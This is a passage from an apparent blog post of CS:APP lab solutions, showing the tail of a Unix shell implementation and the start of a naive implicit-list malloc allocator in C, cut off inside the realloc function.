jobs[i].jid;</span><br><span class="line">        }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">pid_t</span> <span class="title function_">jid2pid</span><span class="params">(<span class="type">int</span> jid)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">if</span> (jid &lt; <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++)</span><br><span class="line">        <span class="keyword">if</span> (jobs[i].jid == jid) {</span><br><span class="line">            <span class="keyword">return</span> jobs[i].pid;</span><br><span class="line">        }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* listjobs - Print the job list */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">listjobs</span><span class="params">(<span class="keyword">struct</span> <span class="type">job_t</span> *jobs)</span> </span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAXJOBS; i++) {</span><br><span class="line">	<span class="keyword">if</span> (jobs[i].pid != <span class="number">0</span>) {</span><br><span class="line">	    <span class="built_in">printf</span>(<span class="string">"[%d] (%d) "</span>, jobs[i].jid, jobs[i].pid);</span><br><span class="line">	    <span class="keyword">switch</span> (jobs[i].state) {</span><br><span class="line">		<span class="keyword">case</span> BG: </span><br><span class="line">		    <span class="built_in">printf</span>(<span class="string">"Running "</span>);</span><br><span class="line">		    <span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> FG: </span><br><span class="line">		    <span class="built_in">printf</span>(<span class="string">"Foreground "</span>);</span><br><span class="line">		    <span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> ST: </span><br><span class="line">		    <span class="built_in">printf</span>(<span class="string">"Stopped "</span>);</span><br><span class="line">		    <span class="keyword">break</span>;</span><br><span class="line">	    <span class="keyword">default</span>:</span><br><span class="line">		    <span class="built_in">printf</span>(<span class="string">"listjobs: Internal error: job[%d].state=%d "</span>, </span><br><span class="line">			   i, jobs[i].state);</span><br><span class="line">	    }</span><br><span class="line">	    <span class="built_in">printf</span>(<span class="string">"%s"</span>, jobs[i].cmdline);</span><br><span class="line">	}</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">list_cont_bgjob</span><span class="params">(<span class="keyword">struct</span> <span class="type">job_t</span>* job)</span></span><br><span class="line">{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[%d] (%d) "</span>, job-&gt;jid, job-&gt;pid);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>, job-&gt;cmdline);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">list_terminated_fgjob</span><span class="params">(<span class="keyword">struct</span> <span class="type">job_t</span>* job)</span></span><br><span class="line">{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Job [%d] (%d) terminated by signal 2\n"</span>, job-&gt;jid, job-&gt;pid);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">list_stopped_fgjob</span><span class="params">(<span class="keyword">struct</span> <span class="type">job_t</span>* job)</span></span><br><span class="line">{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Job [%d] (%d) stopped by signal 20\n"</span>, job-&gt;jid, job-&gt;pid); </span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/******************************</span></span><br><span class="line"><span class="comment"> * end job list helper routines</span></span><br><span class="line"><span class="comment"> ******************************/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/***********************</span></span><br><span class="line"><span class="comment"> * Other helper routines</span></span><br><span class="line"><span class="comment"> ***********************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * usage - print a help message</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">usage</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Usage: shell [-hvp]\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"   -h   print this message\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"   -v   print additional diagnostic information\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"   -p   do not emit a command prompt\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * unix_error - unix-style error routine</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">unix_error</span><span class="params">(<span class="type">char</span> *msg)</span></span><br><span class="line">{</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">"%s: %s\n"</span>, msg, strerror(errno));</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app_error - application-style error routine</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">app_error</span><span class="params">(<span class="type">char</span> *msg)</span></span><br><span class="line">{</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">"%s\n"</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Signal - wrapper for the sigaction function</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">handler_t</span> *<span class="title function_">Signal</span><span class="params">(<span class="type">int</span> signum, <span class="type">handler_t</span> *handler)</span> </span><br><span class="line">{</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">action</span>, <span class="title">old_action</span>;</span></span><br><span class="line"></span><br><span class="line">    action.sa_handler = handler;  </span><br><span class="line">    sigemptyset(&amp;action.sa_mask); <span class="comment">/* block sigs of type being handled */</span></span><br><span class="line">    action.sa_flags = SA_RESTART; <span class="comment">/* restart syscalls if possible */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sigaction(signum, &amp;action, &amp;old_action) &lt; <span class="number">0</span>)</span><br><span class="line">	unix_error(<span class="string">"Signal error"</span>);</span><br><span class="line">    <span class="keyword">return</span> (old_action.sa_handler);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * sigquit_handler - The driver program can gracefully terminate the</span></span><br><span class="line"><span class="comment"> *    child shell by sending it a SIGQUIT signal.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">sigquit_handler</span><span class="params">(<span class="type">int</span> sig)</span> </span><br><span class="line">{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Terminating after receipt of SIGQUIT signal\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<h1 id="lab-7-malloc-lab">Lab 7: Malloc Lab</h1>
<p>This lab needs us to implement your own allocator, which supports
<code>malloc</code>, <code>free</code> and <code>realloc</code>. This
lab might be the hardest one if you pursue a really high score.</p>
<p>Note that I used a relatively harder set of trace files <a href="/resources/code/traces.zip">here</a> than the original set. Set
your target at 95 scores and above if you'd like to challenge yourself.
Oh, don't forget to add there trace files into your
<code>config.h</code>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> DEFAULT_TRACEFILES \</span></span><br><span class="line"><span class="meta">    <span class="string">"amptjp-bal.rep"</span>,\</span></span><br><span class="line"><span class="meta">    <span class="string">"cccp-bal.rep"</span>,\</span></span><br><span class="line"><span class="meta">    <span class="string">"cp-decl-bal.rep"</span>,\</span></span><br><span class="line"><span class="meta">    <span class="string">"expr-bal.rep"</span>,\</span></span><br><span class="line"><span class="meta">    <span class="string">"coalescing-bal.rep"</span>,\</span></span><br><span class="line"><span class="meta">    <span class="string">"random-bal.rep"</span>,\</span></span><br><span class="line"><span class="meta">    <span class="string">"random2-bal.rep"</span>,\</span></span><br><span class="line"><span class="meta">    <span class="string">"binary-bal.rep"</span>,\</span></span><br><span class="line"><span class="meta">    <span class="string">"binary2-bal.rep"</span>,\</span></span><br><span class="line"><span class="meta">    <span class="string">"realloc-bal.rep"</span>,\</span></span><br><span class="line"><span class="meta">    <span class="string">"realloc2-bal.rep"</span>,\</span></span><br><span class="line"><span class="meta">    <span class="string">"boat.rep"</span>,\</span></span><br><span class="line"><span class="meta">    <span class="string">"boat-plus.rep"</span>, \</span></span><br><span class="line"><span class="meta">    <span class="string">"coalesce-big.rep"</span>,  \</span></span><br><span class="line"><span class="meta">    <span class="string">"exhaust.rep"</span>, \</span></span><br><span class="line"><span class="meta">    <span class="string">"seglist.rep"</span></span></span><br></pre></td></tr></table></figure>
<p><strong>Naive Implicit</strong></p>
<p>As a baseline, we first implement the implicit linked list version
from the textbook without any optimization. Here is the code:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">"mm.h"</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">"memlib.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">team_t</span> team = {</span><br><span class="line">    <span class="comment">/* Team name */</span></span><br><span class="line">    <span class="string">"Goodbye"</span>,</span><br><span class="line">    <span class="comment">/* First member's full name */</span></span><br><span class="line">    <span class="string">"Sulley"</span>,</span><br><span class="line">    <span class="comment">/* First member's email address */</span></span><br><span class="line">    <span class="string">"sulley@cs.cmu.edu"</span>,</span><br><span class="line">    <span class="comment">/* Second member's full name (leave blank if none) */</span></span><br><span class="line">    <span class="string">"AnotherSulley"</span>,</span><br><span class="line">    <span class="comment">/* Second member's email address (leave blank if none) */</span></span><br><span class="line">    <span class="string">"anothersulley@cs.cmu.edu"</span></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="comment">/* single word (4) or double word (8) alignment */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALIGNMENT 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> H_ALIGNMENT (ALIGNMENT/2)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* rounds up to the nearest multiple of ALIGNMENT */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALIGN(size) (((size) + (ALIGNMENT-1)) &amp; ~0x7)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Aligned size_t */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIZE_T_SIZE (ALIGN(sizeof(size_t)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Extend heap by this amount */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNKSIZE (1&lt;&lt;12)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Return max */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX(x, y) ((x) &gt; (y) ? (x) : (y))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Pack a size and allocated bit into a word */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PACK(size, alloc) ((size) | (alloc))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Read and write a double word at address p */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET(p)      (*(unsigned int*)(p))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUT(p, val) (*(unsigned int*)(p) = (val))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Read the size and allocated fields from address p */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_SIZE(p)  (GET(p) &amp; ~0x7)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_ALLOC(p) (GET(p) &amp; 0x1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Given block ptr, compute the address of its header and footer */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HDRP(bp)  ((char *)(bp) - H_ALIGNMENT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FTRP(bp)  ((char *)(bp) + GET_SIZE(HDRP(bp)) - ALIGNMENT)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Given block ptr bp, compute address of next and previous blocks */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NEXT_BLKP(bp) ((char *)(bp) + GET_SIZE(HDRP(bp)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREV_BLKP(bp) ((char *)(bp) - GET_SIZE(((char *)(bp) - ALIGNMENT)))</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span>* heap_listp;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span>* <span class="title function_">coalesce</span><span class="params">(<span class="type">void</span> *bp)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">size_t</span> prev_alloc = GET_ALLOC(FTRP(PREV_BLKP(bp)));</span><br><span class="line">    <span class="type">size_t</span> next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(bp)));</span><br><span class="line">    <span class="type">size_t</span> size = GET_SIZE(HDRP(bp));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (prev_alloc &amp;&amp; next_alloc) {</span><br><span class="line">        <span class="keyword">return</span> bp;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (prev_alloc &amp;&amp; !next_alloc) {</span><br><span class="line">        size += GET_SIZE(HDRP(NEXT_BLKP(bp)));</span><br><span class="line">        PUT(HDRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!prev_alloc &amp;&amp; next_alloc) {</span><br><span class="line">        size += GET_SIZE(HDRP(PREV_BLKP(bp)));</span><br><span class="line">        PUT(FTRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">        PUT(HDRP(PREV_BLKP(bp)), PACK(size, <span class="number">0</span>));</span><br><span class="line">        bp = PREV_BLKP(bp);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> {</span><br><span class="line">        size += GET_SIZE(HDRP(PREV_BLKP(bp))) + GET_SIZE(FTRP(NEXT_BLKP(bp)));</span><br><span class="line">        PUT(HDRP(PREV_BLKP(bp)), PACK(size, <span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(NEXT_BLKP(bp)), PACK(size, <span class="number">0</span>));</span><br><span class="line">        bp = PREV_BLKP(bp);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span>* <span class="title function_">find_fit_first_hit</span><span class="params">(<span class="type">size_t</span> asize)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">void</span>* bp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (bp = heap_listp; GET_SIZE(HDRP(bp)) &gt; <span class="number">0</span>; bp = NEXT_BLKP(bp)) {</span><br><span class="line">        <span class="keyword">if</span> (!GET_ALLOC(HDRP(bp)) &amp;&amp; (asize &lt;= GET_SIZE(HDRP(bp)))) {</span><br><span class="line">            <span class="keyword">return</span> bp;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span>* <span class="title function_">find_fit</span><span class="params">(<span class="type">size_t</span> asize)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">return</span> find_fit_first_hit(asize);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">place</span><span class="params">(<span class="type">void</span>* bp, <span class="type">size_t</span> asize)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">size_t</span> csize = GET_SIZE(HDRP(bp));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((csize - asize) &gt;= <span class="number">2</span> * ALIGNMENT) {</span><br><span class="line">        PUT(HDRP(bp), PACK(asize, <span class="number">1</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(asize, <span class="number">1</span>));</span><br><span class="line">        bp = NEXT_BLKP(bp);</span><br><span class="line">        PUT(HDRP(bp), PACK(csize - asize, <span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(csize - asize, <span class="number">0</span>));</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> {</span><br><span class="line">        PUT(HDRP(bp), PACK(csize, <span class="number">1</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(csize, <span class="number">1</span>));</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span>* <span class="title function_">extend_heap</span><span class="params">(<span class="type">size_t</span> words)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">char</span> *bp;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line"></span><br><span class="line">    size = (words % <span class="number">2</span>) ? (words + <span class="number">1</span>) * H_ALIGNMENT : words * H_ALIGNMENT;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">long</span>)(bp = mem_sbrk(size)) == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    PUT(HDRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(HDRP(NEXT_BLKP(bp)), PACK(<span class="number">0</span>, <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> coalesce(bp);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * mm_init - initialize the malloc package.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">mm_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span> ((heap_listp = mem_sbrk(<span class="number">4</span> * H_ALIGNMENT)) == (<span class="type">void</span> *)<span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    PUT(heap_listp, <span class="number">0</span>);</span><br><span class="line">    PUT(heap_listp + <span class="number">1</span> * H_ALIGNMENT, PACK(ALIGNMENT, <span class="number">1</span>));</span><br><span class="line">    PUT(heap_listp + <span class="number">2</span> * H_ALIGNMENT, PACK(ALIGNMENT, <span class="number">1</span>));</span><br><span class="line">    PUT(heap_listp + <span class="number">3</span> * H_ALIGNMENT, PACK(<span class="number">0</span>, <span class="number">1</span>));</span><br><span class="line">    heap_listp += <span class="number">2</span> * H_ALIGNMENT;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (extend_heap(CHUNKSIZE / H_ALIGNMENT) == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * mm_malloc - Allocate a block by incrementing the brk pointer.</span></span><br><span class="line"><span class="comment"> *     Always allocate a block whose size is a multiple of the alignment.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span>* <span class="title function_">mm_malloc</span><span class="params">(<span class="type">size_t</span> size)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">size_t</span> asize;</span><br><span class="line">    <span class="type">size_t</span> extendsize;</span><br><span class="line">    <span class="type">char</span>* bp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size &lt;= ALIGNMENT)</span><br><span class="line">        asize = <span class="number">2</span> * ALIGNMENT;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        asize = ALIGNMENT * ((size + ALIGNMENT + ALIGNMENT - <span class="number">1</span>) / ALIGNMENT);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((bp = find_fit(asize)) != <span class="literal">NULL</span>) {</span><br><span class="line">        place (bp, asize);</span><br><span class="line">        <span class="keyword">return</span> bp;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    extendsize = MAX(asize, CHUNKSIZE);</span><br><span class="line">    <span class="keyword">if</span> ((bp = extend_heap(extendsize / H_ALIGNMENT)) == <span class="literal">NULL</span>)</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">NULL</span>; </span><br><span class="line">    place(bp, asize);</span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * mm_free - Freeing a block does nothing.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">mm_free</span><span class="params">(<span class="type">void</span> *bp)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">size_t</span> size = GET_SIZE(HDRP(bp));</span><br><span class="line">    PUT(HDRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    coalesce(bp);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * mm_realloc - Implemented simply in terms of mm_malloc and mm_free</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span>* <span class="title function_">mm_realloc</span><span class="params">(<span class="type">void</span>* bp, <span class="type">size_t</span> size)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span> (bp == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> mm_malloc(size);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size == <span class="number">0</span>) {</span><br><span class="line">        mm_free(bp);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> osize = GET_SIZE(HDRP(bp)) - ALIGNMENT;</span><br><span class="line">    <span class="type">size_t</span> asize = ALIGNMENT * ((size + ALIGNMENT - <span class="number">1</span>) / ALIGNMENT);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (osize &gt;= asize + <span class="number">2</span> * ALIGNMENT) 